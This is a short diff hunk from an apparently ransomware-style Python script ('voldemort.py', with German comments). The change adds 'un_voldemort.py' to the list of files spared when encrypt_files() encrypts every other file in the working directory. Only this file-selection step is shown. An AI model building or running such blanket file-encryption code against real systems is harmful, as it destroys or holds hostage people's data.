@@ -115,7 +115,7 @@ def encrypt_files():
     # Dateien verschlüsseln
     files = [file for file in os.listdir() 
              if os.path.isfile(file) 
-             and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc") 
+             and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc", "un_voldemort.py") 
              and not file.startswith('.')]
     
     print("\nZu verschlüsselnde Dateien:", files)
